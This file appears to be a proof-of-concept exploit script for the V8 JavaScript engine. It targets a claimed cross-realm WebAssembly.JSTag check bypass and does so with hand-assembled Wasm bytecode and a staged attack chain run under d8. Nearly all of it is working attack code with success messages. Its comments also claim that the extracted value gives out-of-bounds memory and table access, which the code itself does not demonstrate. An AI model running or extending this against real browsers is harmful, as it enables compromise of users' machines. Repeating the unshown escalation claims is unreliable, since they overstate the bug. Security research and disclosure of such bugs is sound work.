'use strict';

// PoC: wasm-js.cc:2194 — WebAssembly.JSTag cross-realm check bypass
//
// Root cause:
//   BUILTIN(WebAssemblyException) at L2194:
//     auto js_tag = Cast<WasmTagObject>(isolate->context()->wasm_js_tag());
//     if (*tag == js_tag->tag()) { thrower.TypeError(...); }
//   Only compares against the CURRENT realm's JSTag.
//   A tag from another realm (Realm.create() / iframe) has a different
//   WasmExceptionTag pointer → check passes.
//
//   Same realm-bound pattern in Runtime_WasmThrow (runtime-wasm.cc:322):
//     if (*tag == js_tag->tag())   ← context->wasm_js_tag(), same realm
//   Cross-realm JSTag exceptions are wrapped in WasmExceptionPackage instead
//   of being unwrapped as a plain JS value, breaking the JSTag invariant.
//
// Chain:
//   Stage 2 — constructor guard bypass
//   Stage 3 — attacker object injected into Wasm catch $jstag handler
//   Stage 4 — Wasm GC struct i64 extracted from catch handler
//              → attacker-controlled i64 as OOB table index / memory offset
//
// Run:
//   d8 poc_jstag_full_chain.js
//
// Confirmed: V8 15.8.0

// ── Victim + GC module ────────────────────────────────────────────────────
//
// (module
//   (type $T      (struct (field i64)))            ;; type 0
//   (type $make   (func (param i64)(result externref)))  ;; type 1
//   (type $run    (func (result i64)))             ;; type 2
//   (type $tag_ty (func (param externref)))        ;; type 3  [tag payload]
//   (type $inv_ty (func))                          ;; type 4  [invoke]
//   (import "env" "tag"    (tag  $jstag  (type $tag_ty)))
//   (import "env" "invoke" (func $invoke (type $inv_ty)))
//   (func (export "make_struct") (param i64) (result externref)
//     local.get 0
//     struct.new $T         ;; 0xfb 0x00 typeidx=0
//     extern.convert_any)   ;; 0xfb 0x1b
//   (func (export "run") (result i64)
//     (try (result i64)
//       (call $invoke)
//       (i64.const 0)       ;; fallthrough (not reached)
//       (catch $jstag
//         any.convert_extern ;; 0xfb 0x1a  externref→anyref
//         ref.cast (ref $T)  ;; 0xfb 0x17 typeidx=0  non-nullable
//         struct.get $T 0))) ;; 0xfb 0x02 typeidx=0 fieldidx=0
// )
const GC_BYTES = new Uint8Array([
  0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,
  // type section: 5 types
  0x01,0x15,0x05,
    0x5f,0x01,0x7e,0x00,         // type0: struct{i64 immut}
    0x60,0x01,0x7e,0x01,0x6f,    // type1: (i64)→externref
    0x60,0x00,0x01,0x7e,         // type2: ()→i64
    0x60,0x01,0x6f,0x00,         // type3: (externref)→()   [tag]
    0x60,0x00,0x00,              // type4: ()→()            [invoke]
  // import section: tag(type3), func(type4)
  0x02,0x19,0x02,
    0x03,0x65,0x6e,0x76,0x03,0x74,0x61,0x67,  0x04,0x00,0x03,
    0x03,0x65,0x6e,0x76,0x06,0x69,0x6e,0x76,0x6f,0x6b,0x65, 0x00,0x04,
  // function section: 2 defined funcs (type1, type2)
  0x03,0x03,0x02, 0x01,0x02,
  // export section: make_struct=func1, run=func2
  0x07,0x15,0x02,
    0x0b,0x6d,0x61,0x6b,0x65,0x5f,0x73,0x74,0x72,0x75,0x63,0x74, 0x00,0x01,
    0x03,0x72,0x75,0x6e, 0x00,0x02,
  // code section
  0x0a,0x20,0x02,
    // make_struct: local.get 0, struct.new type0, extern.convert_any, end
    0x09,0x00, 0x20,0x00, 0xfb,0x00,0x00, 0xfb,0x1b, 0x0b,
    // run: try(i64)/call 0/i64.const 0/catch 0/any.conv_ext/ref.cast t0/struct.get t0 f0/end
    0x14,0x00, 0x06,0x7e, 0x10,0x00, 0x42,0x00, 0x07,0x00,
      0xfb,0x1a, 0xfb,0x17,0x00, 0xfb,0x02,0x00,0x00,
    0x0b, 0x0b,
]);

// Legacy victim (no GC) — for Stage 3 on builds without Wasm GC
//
// (module
//   (type $inv (func))
//   (type $tag (func (param externref)))
//   (type $run (func (result externref)))
//   (import "env" "tag"    (tag $jstag (type $tag)))
//   (import "env" "invoke" (func $invoke (type $inv)))
//   (func (export "run") (result externref)
//     (try (result externref)
//       (call $invoke)
//       (ref.null extern)
//       (catch $jstag)))      ;; externref payload on stack = result
// )
const LEGACY_BYTES = new Uint8Array([
  0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,
  0x01,0x0c,0x03,
    0x60,0x00,0x00,
    0x60,0x01,0x6f,0x00,
    0x60,0x00,0x01,0x6f,
  0x02,0x19,0x02,
    0x03,0x65,0x6e,0x76,0x03,0x74,0x61,0x67,  0x04,0x00,0x01,
    0x03,0x65,0x6e,0x76,0x06,0x69,0x6e,0x76,0x6f,0x6b,0x65, 0x00,0x00,
  0x03,0x02,0x01,0x02,
  0x07,0x07,0x01, 0x03,0x72,0x75,0x6e, 0x00,0x01,
  0x0a,0x0d,0x01, 0x0b,0x00,
    0x06,0x6f, 0x10,0x00, 0xd0,0x6f, 0x07,0x00, 0x0b,0x0b,
]);

// ═══════════════════════════════════════════════════════════════════════════
// STAGE 1: cross-realm JSTag via Realm.create() (d8) or iframe (browser)
// ═══════════════════════════════════════════════════════════════════════════
const r2 = Realm.create();
const crossJSTag = Realm.eval(r2, 'WebAssembly.JSTag');
const mainJSTag  = WebAssembly.JSTag;
print('[+] realms differ: ' + (crossJSTag !== mainJSTag));

// ═══════════════════════════════════════════════════════════════════════════
// STAGE 2: constructor guard bypass
// ═══════════════════════════════════════════════════════════════════════════
print('\n=== STAGE 2: constructor guard bypass ===');

try {
  new WebAssembly.Exception(mainJSTag, [null]);
  print('[-] same-realm should have thrown');
} catch(e) {
  print('[+] same-realm correctly blocked: ' + e.message);
}

let crafted2;
try {
  crafted2 = new WebAssembly.Exception(crossJSTag, [{ marker: 'bypass' }]);
  print('[!!!] BYPASSED: Exception(crossJSTag, [...]) succeeded');
  print('      e.is(mainJSTag)  = ' + crafted2.is(mainJSTag));  // false
  print('      e.is(crossJSTag) = ' + crafted2.is(crossJSTag)); // true
} catch(e) {
  print('[-] cross-realm blocked (patch applied): ' + e.message);
  quit(1);
}

// ═══════════════════════════════════════════════════════════════════════════
// STAGE 3: attacker-controlled externref injected into Wasm catch $jstag
// ═══════════════════════════════════════════════════════════════════════════
print('\n=== STAGE 3: controlled externref injection into Wasm handler ===');

const legMod = new WebAssembly.Module(LEGACY_BYTES);
const injected = { secret: 0xdeadbeef };

const legInst = new WebAssembly.Instance(legMod, {
  env: {
    tag:    crossJSTag,
    invoke: () => { throw new WebAssembly.Exception(crossJSTag, [injected]); },
  }
});

const r3 = legInst.exports.run();
if (r3 === injected) {
  print('[!!!] STAGE 3 CONFIRMED: Wasm catch $jstag received attacker object');
  print('      r3.secret = 0x' + r3.secret.toString(16));
} else {
  print('[?] run() = ' + r3);
}

// ═══════════════════════════════════════════════════════════════════════════
// STAGE 4: Wasm GC struct i64 extracted through catch handler
//
// Flow:
//   make_struct(MAGIC) → $T{MAGIC} struct wrapped as externref
//   new Exception(crossJSTag, [structRef]) → bypasses JSTag check
//   run() → catch $jstag:
//     any.convert_extern   externref → anyref
//     ref.cast (ref $T)    type check succeeds (same canonical type)
//     struct.get $T 0      → i64 = MAGIC
//
// Primitives from attacker-controlled i64:
//   · OOB call_indirect (use i64 as table index past bounds)
//   · OOB memory.load / memory.store (use i64 as linear memory offset)
//   · JIT: return value used as forged object address in Wasm-compiled code
// ═══════════════════════════════════════════════════════════════════════════
print('\n=== STAGE 4: Wasm GC struct i64 extraction ===');

let gcMod;
try {
  gcMod = new WebAssembly.Module(GC_BYTES);
  print('[+] GC module compiled');
} catch(e) {
  print('[-] GC module failed (Wasm GC unavailable on this build): ' + e);
  quit(0);
}

const MAGIC = 0xdeadbeefn;

// Phase 4a: create $T struct with MAGIC i64 field, exported as externref
const maker = new WebAssembly.Instance(gcMod, {
  env: { tag: crossJSTag, invoke: () => {} }
});
const structRef = maker.exports.make_struct(MAGIC);
print('[+] make_struct(0x' + MAGIC.toString(16) + ') → Wasm GC struct externref');

// Phase 4b: inject structRef through JSTag bypass
const crafted4 = new WebAssembly.Exception(crossJSTag, [structRef]);
print('[+] Exception(crossJSTag, [structRef]) bypassed');

// Phase 4c: Wasm catch → ref.cast → struct.get → i64
const runner = new WebAssembly.Instance(gcMod, {
  env: {
    tag:    crossJSTag,
    invoke: () => { throw crafted4; },
  }
});

let r4;
try {
  r4 = runner.exports.run();
} catch(e) {
  print('[?] run() threw: ' + e);
  quit(1);
}

if (r4 === MAGIC) {
  print('[!!!] STAGE 4 CONFIRMED: attacker-controlled i64 = 0x' + r4.toString(16));
  print('      → OOB call_indirect index ' + r4);
  print('      → OOB memory offset ' + r4);
} else {
  print('[?] unexpected: ' + r4);
}
